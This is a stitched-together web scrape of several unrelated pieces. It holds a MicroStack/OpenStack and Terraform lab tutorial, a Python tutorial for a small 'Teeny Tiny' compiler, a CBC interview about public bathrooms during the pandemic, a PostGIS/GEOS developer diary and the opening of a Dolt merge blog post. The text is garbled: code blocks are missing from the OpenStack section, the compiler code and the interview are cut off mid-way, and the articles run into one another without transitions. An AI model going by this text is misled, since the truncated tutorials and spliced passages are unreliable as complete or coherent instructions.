<p>In recent years, OpenStack has become increasingly popular with telecommunications providers. Many of these providers own or have access to telecoms exchanges, and have large data centre footprints spanning cities, countries and even continents. OpenStack allows them to create multi-region clouds of their own, without the need to leverage a public cloud provider.</p>
<h2 id="the-lab">The lab</h2>
<p>OpenStack usually requires a fleet of high-powered servers managed as a cluster (or multiple clusters) of compute, storage and other services. If you want to test out OpenStack on a single machine, there are multiple options available: -</p>
<ul>
<li><a href="https://opendev.org/openstack/devstack">DevStack</a> - Installs OpenStack on a virtual machine (or physical machine) running Ubuntu or Fedora and turns it into a mini OpenStack cloud</li>
<li><a href="https://microstack.run/">MicroStack</a> - A Canonical projcect that deploys a OpenStack inside of a Snap package</li>
<li><a href="https://github.com/openstack/kolla-ansible">Kolla-Ansible</a> - An Ansible project that deploys all the OpenStack services as containers</li>
</ul>
<p>I decided to use MicroStack on an Ubuntu 18.04 LTS virtual machine.</p>
<h3 id="microstack">MicroStack</h3>
<p>To install and run MicroStack, run the following commands: -</p>
<div><pre><code data-lang="bash"><span># Install MicroStack with Classic confinement (i.e. not fully sandboxed)</span>
$ sudo snap install microstack --classic --beta

<span># Initialize MicroStack</span>
$ sudo microstack.init --auto
</code></pre></div><p>After a few minutes (ranging from 5 to 20 minutes, depending on your machine) MicroStack will have finished initializing. The web interface will be available at <code>http://10.20.20.1</code>: -</p>
<p><img src="https://yetiops.net/img/prometheus/microstack-login.png" alt="MicroStack Login Page"></p>
<p>The credentials for this page are: -</p>
<ul>
<li>Username: <code>admin</code></li>
<li>Password: <code>keystone</code></li>
</ul>
<p><img src="https://yetiops.net/img/prometheus/microstack-dashboard.png" alt="MicroStack Dashboard"></p>
<p>You can create a virtual machine (<strong>instance</strong>) from here, or from the command line.</p>
<div><pre><code data-lang="bash"><span># Launch the instance</span>
$ microstack.launch cirros --name test

Server test launched! <span>(</span>status is BUILD<span>)</span>

Access it with <span>`</span>ssh -i $HOME/.ssh/id_microstack<span>`</span> &lt;username&gt;@10.20.20.143

<span># SSH to it, with the MicroStack generated SSH key</span>
$ ssh -i ~/.ssh/id_microstack <a href="https://yetiops.net/cdn-cgi/l/email-protection" data-cfemail="90f3f9e2e2ffe3d0a1a0bea2a0bea2a0bea1a4a3">[email&nbsp;protected]</a>

<span># Check that this machine is running the buildroot OS (which is what CirrOS uses)</span>
$ cat /etc/os-release
NAME<span>=</span>Buildroot
VERSION<span>=</span>2015.05-g31af4e3-dirty
ID<span>=</span>buildroot
VERSION_ID<span>=</span>2015.05
PRETTY_NAME<span>=</span><span>"Buildroot 2015.05"</span>
</code></pre></div><p>Notice that all the commands are prefixed with <code>microstack.</code>. This is because OpenStack runs inside a Snap package.</p>
<h3 id="adding-additional-images">Adding additional images</h3>
<p>By default, MicroStack only includes the CirrOS image. While it is useful for testing that OpenStack can provision resources, it does not provide the ability to install packages.</p>
<p>Many Linux distributions create OpenStack-ready images, a list of which can be found <a href="https://docs.openstack.org/image-guide/obtain-images.html">here</a>.</p>
<p>For this post, I used a Debian Buster image: -</p>
<div><pre><code data-lang="bash"><span># Download the image</span>
$ wget https://cdimage.debian.org/cdimage/openstack/current/debian-10.4.3-20200610-openstack-amd64.qcow2

<span># Add the image to OpenStack</span>
$ microstack.openstack image create <span>\
</span><span></span>            --container-format bare <span>\
</span><span></span>            --disk-format qcow2 <span>\
</span><span></span>            --file debian-10.4.3-20200610-openstack-amd64.qcow2 <span>\
</span><span></span>            debian-buster

<span># Verify that the image is defined</span>

<h2 id="terraform">Terraform</h2>
<p>Terraform has an official <a href="https://www.terraform.io/docs/providers/openstack/index.html">OpenStack Provider</a> that allows you to manage the resources on OpenStack. It can create everything from compute instances, object storage, containers and more.</p>

<h3 id="create-application-credentials">Create application credentials</h3>
<p>You can use OpenStack user credentials (even the <code>admin</code> account) with Terraform if you choose. However, using <strong>application credentials</strong> allows you to restrict what access Terraform has, and can be revoked and/or rotated if the credentials are exposed in some way.</p>
<p>To generate an application credential, you can either use the CLI or the web interface.</p>

<p>You can assign the application credential a member, reader or admin role. As Terraform will be creating resources, the admin role is applicable.</p>
<p>A couple of points to note here are: -</p>
<ul>
<li>The <code>project_id</code> is the OpenStack project in which you create your resources (think of this like a tenant or your account in a public cloud)</li>
<li>The <code>user_id</code> is the ID of this application credential</li>
</ul>
<p>Either note down these credentials, or download them in a <code>clouds.yaml</code> file or an <strong>OpenRC</strong> file. The latter can be sourced in your <code>.bashrc</code>, <code>.zshrc</code> or the <strong>rc</strong> file for the shell of your choice.</p>
<h3 id="provider-configuration">Provider Configuration</h3>
<p>In my Terraform directory, I have create a directory called <code>openstack</code>. In this directory, the provider configuration looks like the below: -</p>

<p>The <code>auth_url</code> uses the <strong>v3</strong> Keystone API endpoint (which will be <code>http://10.20.20.1:5000/v3</code> for any default Microstack install).</p>
<p>The <code>region</code> is <code>microstack</code>. This can be verified with the below: -</p>

<p>The <code>tenant_id</code> is the same as the <code>project_id</code>.</p>
<p>If you have sourced the credentials using the <strong>OpenRC</strong> file in the previous stage, you can remove all of the fields in the provider. Terraform will use environment variables instead. You would then have something like: -</p>

<br><h3>Let's make a Teeny Tiny compiler, part 1</h3><p><small>5/5/2020</small></p><p>

<img src="http://austinhenley.com/blog/images/knightdragon.jpg"></p><p><i>This is the first post in a three part series. Check out <a href="http://web.eecs.utk.edu/~azh/blog/teenytinycompiler2.html">part 2</a> and <a href="http://web.eecs.utk.edu/~azh/blog/teenytinycompiler3.html">part 3</a> when you are ready.</i></p>

<p>It is a beautiful day outside, so let's make a compiler. You don't need any knowledge of how compilers work to follow along. We are going to use Python to implement our own programming language, Teeny Tiny, that will compile to C code. It will take about 500 lines of code and provide the initial infrastructure needed to customize and extend the compiler into your own billion dollar production-ready compiler.</p>

<p>This tutorial is a series of posts that go step by step in building a working compiler. All of the source code can be found in the GitHub <a href="https://github.com/AZHenley/teenytinycompiler">repo</a>. If you follow along with all the posts, I guesstimate that it will take you only a few hours.

</p><p>The Teeny Tiny language we are going to implement is a dialect of <a href="https://en.wikipedia.org/wiki/BASIC">BASIC</a>. The syntax is clean and simple. If you prefer a <a href="https://en.wikipedia.org/wiki/C_(programming_language)">C</a>-like syntax then it will be trivial to modify the compiler at the end.  Here is an example program in our Teeny Tiny language:</p>

<pre>PRINT "How many fibonacci numbers do you want?"
INPUT nums

LET a = 0
LET b = 1
WHILE nums &gt; 0 REPEAT
    PRINT a
    LET c = a + b
    LET a = b
    LET b = c
    LET nums = nums - 1
ENDWHILE	
</pre>

<p>This program prints out terms of the fibonacci sequence based on the user's input: 0 1 1 2 3 5 13...</p>

<p>Our language will allow a variety of the basic operations that you'd expect from a programming language. In particular, it will support:</p>

<ul>
	<li>Numerical variables</li>
	<li>Basic arithmetic</li>
	<li>If statements</li>
	<li>While loops</li>
	<li>Print text and numbers</li>
	<li>Input numbers</li>
	<li>Labels and goto</li>
	<li>Comments</li>
</ul>

<p>Although this is a standard subset of features, you may notice that there are no functions, no arrays, no way to read/write from a file, and not even an else statement. But with just this small set of constructs, you can actually do a lot. It will also setup the compiler in such a way that many other features will be straight forward to add later.</p>

<h4>Compiler Overview</h4>

<p><img src="http://austinhenley.com/blog/images/compilersteps.png"></p><p>Our compiler will follow a three step process that is illustrated above. First, given the inputted source code, it will break the code up into <i>tokens</i>. These are like words and punctuation in English. Second, it will <i>parse</i> the tokens to make sure they are in an order that is allowed in our language. Just like English sentences follow specific structures of verbs and nouns. Third, it will <i>emit</i> the C code that our language will translate to.</p>

<p>We will use these three steps as the main organization for our code. The lexer, parser, and emitter will each have their own Python code file. This tutorial is broken up into 3 parts based on these steps as well. If you were to extend the compiler, there are some additional steps you would add, but we will hold off on discussing those.</p>



<h4>Lexer Overview</h4>

<p>The first module of our compiler is called the <i>lexer</i>. Given a string of Teeny Tiny code, it will iterate character by character to do two things: decide where each token starts/stops and what type of token it is. If the lexer is unable to do this, then it will report an error for an invalid token.</p>

<p><img src="http://austinhenley.com/blog/images/tokens.png"></p><p>The figure demonstrates an example input and output of the lexer. Given the Teeny Tiny code, the lexer must determine where the tokens are along with the type (e.g., keyword). You can see that spaces aren't recognized as tokens, but the lexer will use them as one way to know when a token ends.</p>

<p>Let's finally get into some code, starting with the structure of the lexer in the file <b>lex.py</b>:</p>

<pre>class Lexer:
    def __init__(self, input):
        pass

    # Process the next character.
    def nextChar(self):
        pass

    # Return the lookahead character.
    def peek(self):
        pass

    # Invalid token found, print error message and exit.
    def abort(self, message):
        pass
		
    # Skip whitespace except newlines, which we will use to indicate the end of a statement.
    def skipWhitespace(self):
        pass
		
    # Skip comments in the code.
    def skipComment(self):
        pass

    # Return the next token.
    def getToken(self):
        pass
</pre>

<p>I like to sketch out all the functions that I think I will need, then go back and fill them in. The function <b>getToken</b> will be the meat of the lexer. It will be called each time the compiler is ready for the next token and it will do the work of classifying tokens. <b>nextChar</b> and <b>peek</b> are helper functions for looking at the next character. <b>skipWhitespace</b> consumes the spaces and tabs that we don't care about. <b>abort</b> is what we will use to report an invalid token.</p>

<p>The lexer needs to keep track of the current position in the input string and the character at that position. We will initialize these in the constructor:</p>

<pre>    def __init__(self, input):
        self.source = input + '\n' # Source code to lex as a string. Append a newline to simplify lexing/parsing the last token/statement.
        self.curChar = ''   # Current character in the string.
        self.curPos = -1    # Current position in the string.
        self.nextChar()
</pre>

<p>The lexer needs the input code and we append a newline to it (this just simplifies some checks later on). <b>curChar</b> is what the lexer will constantly check to decide what kind of token it is. Why not just do <i>source[curPos]</i>? Because that would litter the code with bounds checking. Instead we do this in <b>nextChar</b>:</p>

<pre>    # Process the next character.
    def nextChar(self):
        self.curPos += 1
        if self.curPos &gt;= len(self.source):
            self.curChar = '\0'  # EOF
        else:
            self.curChar = self.source[self.curPos]
</pre>

<p>This increments the lexer's current position and updates the current character. If we reach the end of the input, set the character to the end-of-file marker. This is the only place we will modify curPos and curChar. But sometimes we want to look ahead to the next character without updating curPos:</p>

<pre>    # Return the lookahead character.
    def peek(self):
        if self.curPos + 1 &gt;= len(self.source):
            return '\0'
        return self.source[self.curPos+1]
</pre>

<p>We should make sure these functions work. Let's test them by create a new file <b>teenytiny.py</b>:</p>

<pre>from lex import *

def main():
	input = "LET foobar = 123"
	lexer = Lexer(input)

	while lexer.peek() != '\0':
		print(lexer.curChar)
		lexer.nextChar()

main()
</pre>

<p>Run this and the output should be every character of the input string, <i>LET foobar = 123</i>, on a new line:</p>

<pre>L
E 
T 

f 
o 
o 
b 
a 
r 

= 

1 
2 
3 

</pre>

<h4>Classifying Tokens</h4>

<p>But we don't just want characters, we want tokens! We need to plan how combining individual characters together makes a token, which works much like a state machine. Here are the main lexer rules for the Teeny Tiny language:</p>

<ul>
	<li>Operator. One or two consecutive characters that matches: + - * / = == != &gt; &lt; &gt;= &lt;=</li>
	<li>String. Double quotation followed by zero or more characters and a double quotation. Such as: "hello, world!" and ""</li>
	<li>Number. One or more numeric characters followed by an optional decimal point and one or more numeric characters. Such as: 15 and 3.14</li>
	<li>Identifier. An alphabetical character followed by zero or more alphanumeric characters.</li>
	<li>Keyword. Exact text match of: LABEL, GOTO, PRINT, INPUT, LET, IF, THEN, ENDIF, WHILE, REPEAT, ENDWHILE</li>
</ul>

<p>Next we will start our <b>getToken</b> function in our <b>Lexer</b> class:</p>

<pre>    # Return the next token.
    def getToken(self):
        # Check the first character of this token to see if we can decide what it is.
        # If it is a multiple character operator (e.g., !=), number, identifier, or keyword then we will process the rest.
        if self.curChar == '+':
            pass	# Plus token.
        elif self.curChar == '-':
            pass	# Minus token.
        elif self.curChar == '*':
            pass	# Asterisk token.
        elif self.curChar == '/':
            pass	# Slash token.
        elif self.curChar == '\n':
            pass	# Newline token.
        elif self.curChar == '\0':
            pass	# EOF token.
        else:
            # Unknown token!
            pass
			
        self.nextChar()
</pre>

<p>This will detect a few possible tokens, but doesn't do anything useful yet. What we need next is a <b>Token</b> class to keep track of what type of token it is and the exact text from the code. Place this in <b>Lex.py</b> for now:</p>

<pre># Token contains the original text and the type of token.
class Token:   
    def __init__(self, tokenText, tokenKind):
        self.text = tokenText   # The token's actual text. Used for identifiers, strings, and numbers.
        self.kind = tokenKind   # The TokenType that this token is classified as.
</pre>

<p>To specify what type a token is, we will create the <b>TokenType</b> class as an enum. It looks long, but it just specifies every possible token our language allows. Add <i>import enum</i> to the top of <b>Lex.py</b> and add this class:</p>

<pre># TokenType is our enum for all the types of tokens.
class TokenType(enum.Enum):
	EOF = -1
	NEWLINE = 0
	NUMBER = 1
	IDENT = 2
	STRING = 3
	# Keywords.
	LABEL = 101
	GOTO = 102
	PRINT = 103
	INPUT = 104
	LET = 105
	IF = 106
	THEN = 107
	ENDIF = 108
	WHILE = 109
	REPEAT = 110
	ENDWHILE = 111
	# Operators.
	EQ = 201  
	PLUS = 202
	MINUS = 203
	ASTERISK = 204
	SLASH = 205
	EQEQ = 206
	NOTEQ = 207
	LT = 208
	LTEQ = 209
	GT = 210
	GTEQ = 211
</pre>

<p>Now we can expand <b>getToken</b> to actually do something when it detects a specific token:</p>

<pre>    # Return the next token.
    def getToken(self):
        token = None

        # Check the first character of this token to see if we can decide what it is.
        # If it is a multiple character operator (e.g., !=), number, identifier, or keyword then we will process the rest.
        if self.curChar == '+':
            token = Token(self.curChar, TokenType.PLUS)
        elif self.curChar == '-':
            token = Token(self.curChar, TokenType.MINUS)
        elif self.curChar == '*':
            token = Token(self.curChar, TokenType.ASTERISK)
        elif self.curChar == '/':
            token = Token(self.curChar, TokenType.SLASH)
        elif self.curChar == '\n':
            token = …</pre></div></div></div>

It's whether the pandemic will be the tipping point that teaches people the truth about public bathrooms,"&nbsp;Lezlie Lowe, a Halifax journalist and author of <em>No Place To Go: How Public Toilets Fail Our Private Needs,</em>&nbsp;<a href="https://thewalrus.ca/why-are-canadas-public-bathrooms-so-inadequate/" target="_blank">wrote&nbsp;this week in The Walrus</a>.</p>  <p>"[F]ar from being unhygienic, unsafe or simply unimportant, with the correct distancing and cleaning measures, these facilities are a crucial part of any effective plan for preventing disease and easing inequity."</p>  <p>Here is part of Lowe's&nbsp;conversation with <em>As It Happens</em> guest host Nil Köksal.</p>  <p><strong>If you left the building that you're in right now in Halifax, how far would you have to walk to find a public bathroom?&nbsp;</strong></p>  <p>Oh, my gracious. I don't even actually know how far I would have to walk. Quite a distance, I think.&nbsp;</p>  <p><strong>How much more has this pandemic revealed about the issue of public bathrooms in this country?&nbsp;</strong></p>  <p>What we've seen during the pandemic all across the country is that, in Canada, we really have a culture of relying on publicly accessible toilets, which is to say toilets that are in private businesses …&nbsp;rather than public bathrooms, which are bathrooms that would be on streets, paid for by taxes and just considered part of the kind of basket of goods that we know we need to use our cities safely.&nbsp;</p>  <p>Stop signs and sidewalks and benches and trash cans —&nbsp;we know we need all those things. We&nbsp;don't really question paying for those things out of our municipal tax dollars. But bathrooms have really been left out of that in Canada and in other other parts of North America.&nbsp;</p>  <p>What we've seen with COVID is there's been this really big shutdown. And so not only have the few public bathrooms that are in many cities closed, but we've seen all these publicly accessible bathrooms closed.&nbsp;And all of a sudden people are like, "Wait a minute, wait a minute," who really actually had pretty good access before. And now, they're feeling what it's like to have diminished access.&nbsp;</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5645520.1594414394!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/rileysmithphoto.jpeg 300w,https://i.cbc.ca/1.5645520.1594414394!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/rileysmithphoto.jpeg 460w,https://i.cbc.ca/1.5645520.1594414394!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/rileysmithphoto.jpeg 620w,https://i.cbc.ca/1.5645520.1594414394!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/rileysmithphoto.jpeg 780w,https://i.cbc.ca/1.5645520.1594414394!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/rileysmithphoto.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5645520.1594414394!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/rileysmithphoto.jpeg"></p></div><figcaption>Lowe is a Halifax journalist and journalism professor, and author of No Place To Go: How Public Toilets Fail Our Private Needs.<!-- --> <!-- -->(Riley Smith )</figcaption></figure></span></p>  <p><strong>You've also written that bathrooms are about mobility. Elaborate on that.&nbsp;</strong></p>  <p>When you look at any sort of municipal plan for any cities — and I did a lot of this research for my book — cities talk about walkability, they talk about livability, they talk about being pedestrian friendly and cyclist friendly, and a lot of talk about people aging in place.&nbsp;</p>  <p>None of those things are possible without a reasonable, accessible grid of public bathrooms because there is absolutely no way around the fact that bathrooms are needed by everybody every day of their lives.&nbsp;</p>  <p>Everybody uses the bathroom. And what we see in cities is you can go farther&nbsp;and you can stay out longer when you have access to that grid of public bathrooms.&nbsp;</p>    <blockquote><span><span><svg version="1.1" focusable="false" x="0px" y="0px" width="30px" height="25px" viewBox="0 0 52.157 39.117" enable-background="new 0 0 52.157 39.117" space="preserve"><g><g><path fill="000000" d="M22.692,10.113c-5.199,1.4-8.398,4.4-8.398,8.801c0,2.4,2,3,3.6,4.199c2.2,1.602,3.4,3.4,3.4,6.602   c0,3.799-3.4,6.799-7.4,6.799c-4.6,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z M45.692,10.113   c-5.199,1.4-8.399,4.4-8.399,8.801c0,2.4,2,3,3.601,4.199c2.2,1.602,3.399,3.4,3.399,6.602c0,3.799-3.399,6.799-7.399,6.799   c-4.601,0-8.8-3.199-8.8-10.6c0-13.6,7-20,17.599-21.799V10.113z"></path></g></g><g display="none"><g display="inline"> <path fill="000000" d="M6.648,29.759c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.399-3.4-3.399-6.6   c0-3.801,3.399-6.801,7.399-6.801c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z M29.648,29.759   c5.199-1.4,8.398-4.4,8.398-8.801c0-2.398-2-3-3.599-4.199c-2.2-1.6-3.401-3.4-3.401-6.6c0-3.801,3.401-6.801,7.401-6.801   c4.599,0,8.8,3.201,8.8,10.6c0,13.6-7,20-17.6,21.801V29.759z"></path></g></g></svg>We're taught that bathrooms are places where you do private things, which they are.

They're also kind of a joke. You know, I wrote a book about public bathroom access. There's only two responses. People are either like, "Ew, that's gross." Or they're kind of like, "Ha ha ha!"&nbsp;</p>  <p>So we have these really kind of almost neurotic responses to public bathrooms, and we're taught that as kids. And what happens is when we become adults, we sort of lack the capacity for talking about, you know, the basic need to go to the bathroom, in a serious way. And I think that is actually borne out in the policy decisions of cities.&nbsp;</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5645542.1594409137!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/olympics-beijing-names.JPG 300w,https://i.cbc.ca/1.5645542.1594409137!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/olympics-beijing-names.JPG 460w,https://i.cbc.ca/1.5645542.1594409137!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/olympics-beijing-names.JPG 620w,https://i.cbc.ca/1.5645542.1594409137!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/olympics-beijing-names.JPG 780w,https://i.cbc.ca/1.5645542.1594409137!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/olympics-beijing-names.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5645542.1594409137!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/olympics-beijing-names.JPG"></p></div><figcaption>People walk past a public toilet in Beijing.<!-- --> <!-- -->(Claro Cortes Iv/Reuters)</figcaption></figure></span></p>  <p><strong>And people experiencing homelessness in cities, including Toronto, have talked about this in recent weeks as well. Access for them is an issue.&nbsp;</strong></p>  <p>Yeah. And I mean, I'm sure that is exacerbated now.&nbsp;</p>  <p>We talk about COVID, but we also have to think about the other health risks that are actually around when we look at public bathrooms. And there's ongoing hepatitis A outbreaks due to public defecation. I mean, there's very serious health concerns that we need to take into account when we think about what the value of having public bathrooms is.&nbsp;</p>  <p><strong>And on the issue of COVID, I suspect some municipal leaders might say, you know, we just can't keep up. You have to clean these facilities. They wouldn't be safe, especially during a pandemic. But in your most recent article about this in The Walrus, you say public bathrooms aren't really riskier than any other high-touch public spaces.&nbsp;</strong></p>  <p>We do automatically think of public bathrooms as these sort of paragons of filth. And, yeah, they can get really dirty. But so can other spaces.&nbsp;</p>  <p>Public bathrooms are not a high risk for COVID for a couple reasons. One is that COVID is a respiratory illness. And so what we know is that we need to stay out of small spaces with shared air with strangers. That's the same as an elevator. Nobody is talking about closing every elevator in every high-rise because they're too risky. We're just putting mitigation factors in place. So, you know, we say only two people in an elevator.&nbsp;</p>  <p>The other issue is high-touch surfaces. Yes, there are high-touch surfaces in bathrooms, but there are also high-touch surfaces entering, you know, malls and public libraries and restaurants and elevators, for that matter. And so, yeah, there needs to be enhanced cleaning. That's no different than any other space right now as we're coping with the pandemic.&nbsp;</p>  <p>The one thing that I would say sets public bathrooms apart when we're talking about COVID is, ironically, the fact that we practise hand hygiene in public bathrooms. Public bathrooms are the places we go to help get the virus off of our hands. So that sort of puts, I would say, a greater onus on cities to do those reasonable control of access and sanitizing solutions&nbsp;but also keeping bathrooms open, because people need to wash their hands more than ever when it comes to this virus.&nbsp;</p>  <p><span><span><span></span><span>Andrew Chang looks into whether you’re likely to contract COVID-19 from using a public bathroom.<!-- --> <!-- -->1:02</span></span></span></p>  <p><strong>Any sense of the costs for cities to put these public washrooms in?&nbsp;</strong></p>  <p>Bathrooms are not cheap. They are, if you're looking at the on-street automated toilets that you mentioned earlier, those can cost, you know, a quarter of a million dollars to install.&nbsp;</p>  <p>I think we have to ask ourselves, who do we want to be? What do we want as a society? Because when we talk about livability, we talk about walkability. When we talk about people aging in place, if we say we want those things, then we actually have to put in place the supports that support those things.&nbsp;</p>  <p>So I think that, yes, they are costly, but they are also necessary to human dignity and to the full and reasonable use of our cities.&nbsp;</p>    <p><strong>Do you think the pandemic, as you wrote, will be a tipping point?&nbsp;</strong></p>  <p>I can say that, you know, as the person who wrote the book on public toilets, I have never talked about public toilets so much as I have in the last four months. And I think that's fantastic.&nbsp;</p>  <hr>  <p><em>Written by Sheena Goodyear.

  <p><span>11 Jun 2020</span></p><p>Have you ever watched a team of five-year-olds play soccer? The way the mass of children chases the ball around in a group? I think programmers do that too.</p>

<p><img src="http://blog.cleverelephant.ca/images//2020/youth-soccer.jpg" alt="Get the ball!"></p>

<p>There’s something about working on a problem together that is so much more rewarding than working separately, we cannot help but get drawn into other peoples problems. There’s a lot of gratification to be had in finding a solution to a shared difficulty!</p>

<p>Even better, different people bring different perspectives to a problem, and illuminate different areas of improvement.</p>

<h2 id="maximum-inscribed-circle">Maximum Inscribed Circle</h2>

<p>A couple months ago, my colleague <a href="https://www.linkedin.com/in/mrmartindavis">Martin Davis</a> committed a pair of new routines into JTS, to <a href="http://lin-ear-th-inking.blogspot.com/2020/04/maximum-inscribed-circle-and-largest.html">calculate the largest circles</a> that can fit inside a polygon or in a collection of geometries.</p>

<p><img src="http://blog.cleverelephant.ca/images//2020/canada_mic.png" alt="Maximum Inscribed Circle"></p>

<p>We want to bring all the algorithmic goodness of JTS to PostGIS, so I took up the first step, and <a href="https://github.com/libgeos/geos/commit/0909042df5f8d4b9ae1832b3fd67713e206057fb">ported “maximum inscribed circle” to GEOS</a> and <a href="https://github.com/postgis/postgis/commit/b5bd6836d4617ebc924e804c42b60de637a94f60">to PostGIS</a>.</p>

<p>When I ported the GEOS test cases, I turned up some odd performance problems. The calculation seemed to be taking inordinately long for larger inputs. What was going on?</p>

<p>The “maximum inscribed circle” algorithm leans heavily on a routine called <a href="https://github.com/libgeos/geos/blob/1357b728c30c6008d6d4fafba158f0cee71f3e9d/src/operation/distance/IndexedFacetDistance.cpp">IndexedFacetDistance</a> to calculate distances between polygon boundaries and candidate circle-centers while converging on the “maximum inscribed circle”. If that routine is slow, the whole algorithm will be slow.</p>

<p>Dan Baston, who originally ported the “IndexedFacetDistance” class got interested and started looking at some test cases of his own.</p>

<p>He found he could improve his old implementation using <a href="https://github.com/libgeos/geos/commit/1357b728c30c6008d6d4fafba158f0cee71f3e9d">better memory management</a> that he’d learned in the meantime. He also found <a href="https://github.com/libgeos/geos/pull/314">some short-circuits</a> to envelope distance calculation that improved performance quite a bit.</p>

<p>In fact, they improved performance so much that Martin <a href="https://github.com/locationtech/jts/pull/534">ported them back to JTS</a>, where he found that for some cases he could log a <strong>10x performance</strong> in distance calculations.</p>

<p>There’s something alchemical about the whole thing.</p>

<ul>
  <li>There was a bunch of long-standing code nobody was looking at.</li>
  <li>I ported an unrelated algorithm which exercised that code.</li>
  <li>I wrote a test case and reported some profiling information.</li>
  <li>Other folks with more knowledge were intrigued.</li>
  <li>They fed their knowledge back and forth and developed more tests.</li>
  <li>Improvements were found that made everything faster.</li>
</ul>

<p>I did nothing except shine a light in a dark hole, and everyone else got very excited and things happened.</p>

<h2 id="toast-caching-redux">Toast Caching Redux</h2>

<p>In a similar vein, as I described in my <a href="http://blog.cleverelephant.ca/2020/04/developer-life.html">last diary entry</a>, a long-standing performance issue in PostGIS was the repeated reading of large geometries during spatial joins.</p>

<p>Much of the problem was solved by dropping a very small “<a href="https://github.com/postgis/postgis/commit/8b548a4697490b7e45508b91cb340eb79b424a92">TOAST cache</a>” into the process by which PostGIS reads geometries in functions frequently used in spatial joins.</p>

<p><img src="http://blog.cleverelephant.ca/images//2020/facepalm.gif" alt="TOAST"></p>

<p>I was so happy with the improvement the TOAST cache provided that I just stopped. Fortunately, my fellow PostGIS community member <a href="https://github.com/Algunenano">Raúl Marín</a> was more stubborn.</p>

<p>Having seen my commit of the TOAST cache, and having done some work in other caching parts of PostGIS, he took up the challenge and <a href="https://github.com/postgis/postgis/commit/10c9dc2ac242c194763a47edab2b2487b42eb3a6">integrated the TOAST cache with the existing index caches</a>.</p>

<p>The integrated system now uses TOAST identifiers to note identical repeated inputs and avoid both unneccessary reads off disk and unncessary cache checks of the index cache.</p>

<p>The result is that, for spatial joins over large objects, PostGIS 3.1 will be as much as 60x faster than the performance in PostGIS 3.0.</p>

<p>I prepared a demo for a bid proposal this week and found that an example query that took <strong>800ms</strong> on my laptop took a <strong>full minute</strong> on the beefy 16-core demo server. What had I done wrong? Ah! My laptop is running the <strong>latest</strong> PostGIS code (which will become 3.1) while the cloud server was running PostGIS <strong>2.4</strong>. Mystery solved!</p>

<h2 id="port-port-port">Port, Port, Port</h2>

<p>I may have <a href="http://blog.cleverelephant.ca/2020/04/developer-life.html">mentioned</a> that I’m not a very good programmer.</p>

<p>My current task is definitely exercising my imposter syndrome: porting Martin’s <a href="http://lin-ear-th-inking.blogspot.com/2020/05/jts-overlay-next-generation.html">new overlay code</a> from JTS to GEOS.</p>

<p>I knew it would take a long time, and I knew it would be a challenge; but knowing and experiencing are quite different things.</p>

<p>The challenges, as I’ve experienced them are:</p>

<ul>
  <li>Moving from Java’s garbage collected memory model to C++’s managed memory model means that I have to understand the object life-cycle which is <strong>implicit</strong> in Java and make it <strong>explicit</strong> in C++, all while avoiding accidentally introducing a lot of memory churn and data copying into the GEOS port. Porting isn’t a simple matter of transcribing and papering over syntactic idiom, it involves first understanding the actual JTS algorithms.</li>
  <li>The age of the GEOS code base, and number of contributors over time, mean that there are a huge number of different patterns to potentially follow in trying to make a “consistent” port to GEOS. Porting isn’t a matter of blank-slate implementation of the JTS code – the ported GEOS code has to slot into the <strong>existing</strong> GEOS layout. So I have to spend a lot of time learning how previous implementations chose to handle life cycles and call patterns (pass reference, or pointer? yes. Return value? or void return and output parameter? also yes.)</li>
  <li>My lack of C++ idiom means I spend an excessive amount of time looking up core functions and methods associated with them. This is the only place I’ve felt myself measurably get better over the past weeks.</li>
</ul>

<p>I’m still only just getting started, having ported some core data structures, and little pieces of dependencies that the overlay needs. The reward will be a hugely improved overlay code for GEOS and thus PostGIS, but I anticipate the debugging stage of the port will take quite a while, even when the code is largely complete.</p>

<p>Wish me luck, I’m going to need it!</p>

<p>If you would like to test the new JTS overlay code, it resides on <a href="https://github.com/dr-jts/jts/tree/overlay-sr">this branch</a>. <br>If you would like to watch me suffer as I work on the port, the GEOS branch is <a href="https://github.com/libgeos/geos/tree/overlay-sr">here</a>.</p>

<![CDATA[Cell-level Three-way Merge in Dolt]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://github.com/liquidata-inc/dolt">Dolt</a> is a SQL database with Git-like
functionality. It supports version control primitives including commit,
branch, merge, clone, push and pull. This is the fourth post in a series
exploring how Dolt stores table data implements these version control
primitives. Previously, we looked at <a href="https://www.dolthub.com/blog/2020-04-01-how-dolt-stores-table-data/">the content-addressed sorted index
structure</a> underlying Dolt's table
storage, called a Prolly-tree.  In the second post, I explained <a href="https://www.dolthub.com/blog/2020-05-13-dolt-commit-graph-and-structural-sharing/">the Dolt
commit graph</a> and how
table storage in Dolt is shared across revisions of the table.  In our last
post, we talked about <a href="https://www.dolthub.com/blog/2020-06-16-efficient-diff-on-prolly-trees/">implementing diff efficiently on top of
Prolly-trees</a>.</p>
<p>In this post, we're going to look at how Dolt implements <code>merge</code> by using a
cell-level three-way merge algorithm.</p>

<p>Merge is a fundamental operation in (D)VCS and finding a way to do effective
merges of source files in version control systems is what allowed VCS
implementations to move away from file locking and into a workflow where
multiple people can work on the same files at the same time.</p>
<p>A merge takes two divergent revisions of a source document which are created
by two divergent histories of changes to that document and produces a new
